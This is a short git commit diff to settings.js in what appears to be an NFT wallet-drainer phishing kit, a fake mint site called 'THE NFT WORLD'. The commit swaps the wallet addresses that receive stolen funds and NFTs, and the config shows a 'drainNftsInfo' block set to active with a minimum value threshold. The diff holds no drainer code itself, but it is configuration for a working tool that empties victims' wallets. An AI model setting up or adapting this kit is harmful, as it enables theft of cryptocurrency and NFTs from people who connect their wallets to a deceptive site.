b27a18a9f79c1a44f95fbbdb96ad781decfda843
123mfers <118822609+123mfers@users.noreply.github.com>
2022-11-22 13:11:14 +0000

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0x2D6049DdF0B342b95b5c68dEa0283b4f0e1108Df',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x2D6049DdF0B342b95b5c68dEa0283b4f0e1108Df',
   },
 
   customStrings = {
